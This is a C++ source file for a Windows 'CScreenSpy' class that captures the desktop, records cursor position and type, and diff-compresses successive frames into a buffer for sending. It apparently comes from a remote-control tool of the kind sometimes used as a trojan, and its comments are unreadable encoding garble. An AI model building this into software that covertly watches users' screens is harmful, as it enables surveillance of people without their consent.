// ScreenSpy.cpp: implementation of the CScreenSpy class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "ScreenSpy.h"
#include "Common.h"
#include <stdio.h>

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CScreenSpy::CScreenSpy(ULONG ulbiBitCount)
{
	m_bAlgorithm = ALGORITHM_DIFF;
	m_dwBitBltRop = SRCCOPY;
	m_BitmapInfor_Full = NULL;
	switch (ulbiBitCount)
	{
	case 16:
	case 32:
		m_ulbiBitCount = ulbiBitCount;
		break;
	default:
		m_ulbiBitCount = 16;
	}

	m_hDeskTopWnd = GetDesktopWindow();
	m_hFullDC = GetDC(m_hDeskTopWnd);

	m_hFullMemDC	= CreateCompatibleDC(m_hFullDC);
	//::GetSystemMetrics(SM_CXSCREEN/SM_CYSCREEN)��ȡ��Ļ��С��׼
	//���統��Ļ��ʾ����Ϊ125%ʱ����ȡ������Ļ��С��Ҫ����1.25�Ŷ�
	DEVMODE devmode;
	memset(&devmode, 0, sizeof (devmode));	
	devmode.dmSize = sizeof(DEVMODE);
	devmode.dmDriverExtra = 0;
	BOOL Isgetdisplay = EnumDisplaySettings(NULL, ENUM_CURRENT_SETTINGS, &devmode);
	m_ulFullWidth = devmode.dmPelsWidth;
	m_ulFullHeight = devmode.dmPelsHeight;
	printf("===> ����ֱ��ʴ�СΪ��%d x %d\n", m_ulFullWidth, m_ulFullHeight);
	m_BitmapInfor_Full = ConstructBI(m_ulbiBitCount,m_ulFullWidth, m_ulFullHeight);
	m_BitmapData_Full = NULL;
	m_BitmapHandle	= ::CreateDIBSection(m_hFullDC, m_BitmapInfor_Full, 
		DIB_RGB_COLORS, &m_BitmapData_Full, NULL, NULL);
	::SelectObject(m_hFullMemDC, m_BitmapHandle);

	m_RectBuffer = new BYTE[m_BitmapInfor_Full->bmiHeader.biSizeImage * 2];

	m_RectBufferOffset = 0;

	m_hDiffMemDC	= CreateCompatibleDC(m_hFullDC); 
	m_DiffBitmapHandle	= ::CreateDIBSection(m_hFullDC, m_BitmapInfor_Full, 
		DIB_RGB_COLORS, &m_DiffBitmapData_Full, NULL, NULL);
	::SelectObject(m_hDiffMemDC, m_DiffBitmapHandle);
}


CScreenSpy::~CScreenSpy()
{
	ReleaseDC(m_hDeskTopWnd, m_hFullDC);   //GetDC
	if (m_hFullMemDC!=NULL)
	{
		DeleteDC(m_hFullMemDC);                //Createƥ���ڴ�DC

		::DeleteObject(m_BitmapHandle);
		if (m_BitmapData_Full!=NULL)
		{
			m_BitmapData_Full = NULL;
		}

		m_hFullMemDC = NULL;
	}

	if (m_hDiffMemDC!=NULL)
	{
		DeleteDC(m_hDiffMemDC);                //Createƥ���ڴ�DC

		::DeleteObject(m_DiffBitmapHandle);
		if (m_DiffBitmapData_Full!=NULL)
		{
			m_DiffBitmapData_Full = NULL;
		}
	}

	if (m_BitmapInfor_Full!=NULL)
	{
		delete[] m_BitmapInfor_Full;
		m_BitmapInfor_Full = NULL;
	}

	if (m_RectBuffer)
	{
		delete[] m_RectBuffer;
		m_RectBuffer = NULL;
	}

	m_RectBufferOffset = 0;
}


ULONG CScreenSpy::GetBISize()
{
	ULONG	ColorNum = m_ulbiBitCount <= 8 ? 1 << m_ulbiBitCount : 0;

	return sizeof(BITMAPINFOHEADER) + (ColorNum * sizeof(RGBQUAD));
}

LPBITMAPINFO CScreenSpy::GetBIData()
{
	return m_BitmapInfor_Full;  
}

LPBITMAPINFO CScreenSpy::ConstructBI(ULONG ulbiBitCount, 
									 ULONG ulFullWidth, ULONG ulFullHeight)
{
	int	ColorNum = ulbiBitCount <= 8 ? 1 << ulbiBitCount : 0;
	ULONG ulBitmapLength  = sizeof(BITMAPINFOHEADER) + (ColorNum * sizeof(RGBQUAD));   //BITMAPINFOHEADER +����ɫ��ĸ���
	BITMAPINFO	*BitmapInfor = (BITMAPINFO *) new BYTE[ulBitmapLength]; //[][]

	BITMAPINFOHEADER* BitmapInforHeader = &(BitmapInfor->bmiHeader);

	BitmapInforHeader->biSize = sizeof(BITMAPINFOHEADER);//pi si 
	BitmapInforHeader->biWidth = ulFullWidth; //1080
	BitmapInforHeader->biHeight = ulFullHeight; //1920
	BitmapInforHeader->biPlanes = 1;
	BitmapInforHeader->biBitCount = ulbiBitCount; //32
	BitmapInforHeader->biCompression = BI_RGB;
	BitmapInforHeader->biXPelsPerMeter = 0;
	BitmapInforHeader->biYPelsPerMeter = 0;
	BitmapInforHeader->biClrUsed = 0;
	BitmapInforHeader->biClrImportant = 0;
	BitmapInforHeader->biSizeImage = 
		((BitmapInforHeader->biWidth * BitmapInforHeader->biBitCount + 31)/32)*4* BitmapInforHeader->biHeight;

	// 16λ���Ժ��û����ɫ��ֱ�ӷ���

	return BitmapInfor;
}

LPVOID CScreenSpy::GetFirstScreenData()
{
	//���ڴ�ԭ�豸�и���λͼ��Ŀ���豸
	::BitBlt(m_hFullMemDC, 0, 0, 
		m_ulFullWidth, m_ulFullHeight, m_hFullDC, 0, 0, m_dwBitBltRop);

	return m_BitmapData_Full;  //�ڴ�
}


ULONG CScreenSpy::GetFirstScreenLength()
{
	return m_BitmapInfor_Full->bmiHeader.biSizeImage; 
}

LPVOID CScreenSpy::GetNextScreenData(ULONG* ulNextSendLength)
{
	if (ulNextSendLength == NULL || m_RectBuffer == NULL)
	{
		return NULL;
	}

	// ����rect������ָ��
	m_RectBufferOffset = 0;  

	// д��ʹ���������㷨
	WriteRectBuffer((LPBYTE)&m_bAlgorithm, sizeof(m_bAlgorithm));

	// д����λ��
	POINT	CursorPos;
	GetCursorPos(&CursorPos);
	WriteRectBuffer((LPBYTE)&CursorPos, sizeof(POINT));

	// д�뵱ǰ�������
	BYTE	bCursorIndex = m_CursorInfor.GetCurrentCursorIndex();
	WriteRectBuffer(&bCursorIndex, sizeof(BYTE));

	// ����Ƚ��㷨
	if (m_bAlgorithm == ALGORITHM_DIFF)
	{
		// �ֶ�ɨ��ȫ��Ļ  ���µ�λͼ���뵽m_hDiffMemDC��
		ScanScreen(m_hDiffMemDC, m_hFullDC, m_BitmapInfor_Full->bmiHeader.biWidth,
			m_BitmapInfor_Full->bmiHeader.biHeight);

		//����Bit���бȽ������һ���޸�m_lpvFullBits�еķ���
		*ulNextSendLength = m_RectBufferOffset + 
			CompareBitmap((LPBYTE)m_DiffBitmapData_Full, (LPBYTE)m_BitmapData_Full,
			m_RectBuffer + m_RectBufferOffset, m_BitmapInfor_Full->bmiHeader.biSizeImage);	
		return m_RectBuffer;
	}

	return NULL;
}


VOID CScreenSpy::WriteRectBuffer(LPBYTE	szBuffer,ULONG ulLength)
{
	memcpy(m_RectBuffer + m_RectBufferOffset, szBuffer, ulLength);   
	m_RectBufferOffset += ulLength;
}


VOID CScreenSpy::ScanScreen(HDC hdcDest, HDC hdcSour, ULONG ulWidth, ULONG ulHeight)
{
#ifdef COPY_ALL
	BitBlt(hdcDest, 0, 0, ulWidth, ulHeight, hdcSour, 0, 0, m_dwBitBltRop);
#else
	const ULONG	ulJumpLine = 50;
	const ULONG	ulJumpSleep = ulJumpLine / 10; 

	for (int i = 0, ulToJump = 0; i < ulHeight; i += ulToJump)
	{
		ULONG  ulv1 = ulHeight - i;  

		if (ulv1 > ulJumpLine)  
			ulToJump = ulJumpLine; 
		else
			ulToJump = ulv1;
		BitBlt(hdcDest, 0, i, ulWidth, ulToJump, hdcSour,0, i, m_dwBitBltRop);
		Sleep(ulJumpSleep);
	}
#endif
}

ULONG CScreenSpy::CompareBitmap(LPBYTE CompareSourData, LPBYTE CompareDestData, 
								LPBYTE szBuffer, DWORD ulCompareLength)
{
	// Windows�涨һ��ɨ������ռ���ֽ���������4�ı���, ������DWORD�Ƚ�
	LPDWORD	p1, p2;
	p1 = (LPDWORD)CompareDestData;
	p2 = (LPDWORD)CompareSourData;

	// ƫ�Ƶ�ƫ�ƣ���ͬ���ȵ�ƫ��
	ULONG ulszBufferOffset = 0, ulv1 = 0, ulv2 = 0;
	ULONG ulCount = 0; // ���ݼ�����
	// p1++ʵ�����ǵ�����һ��DWORD
	for (int i = 0; i < ulCompareLength; i += 4, p1++, p2++)
	{
		if (*p1 == *p2)  
			continue;
		// һ�������ݿ鿪ʼ
		// д��ƫ�Ƶ�ַ

		*(LPDWORD)(szBuffer + ulszBufferOffset) = i;     
		// ��¼���ݴ�С�Ĵ��λ��
		ulv1 = ulszBufferOffset + sizeof(int);  //4
		ulv2 = ulv1 + sizeof(int);    //8
		ulCount = 0; // ���ݼ���������

		// ����Dest�е�����
		*p1 = *p2;
		*(LPDWORD)(szBuffer + ulv2 + ulCount) = *p2;

		/*
		[1][2][3][3]          
		[1][3][2][1]

		[0000][   ][1321]
		*/
		ulCount += 4;
		i += 4, p1++, p2++;	
		for (int j = i; j < ulCompareLength; j += 4, i += 4, p1++, p2++)
		{
			if (*p1 == *p2)
				break;

			// ����Dest�е�����
			*p1 = *p2;
			*(LPDWORD)(szBuffer + ulv2 + ulCount) = *p2;
			ulCount += 4;
		}
		// д�����ݳ���
		*(LPDWORD)(szBuffer + ulv1) = ulCount;
		ulszBufferOffset = ulv2 + ulCount;	
	}

	// nOffsetOffset ����д����ܴ�С
	return ulszBufferOffset;
}
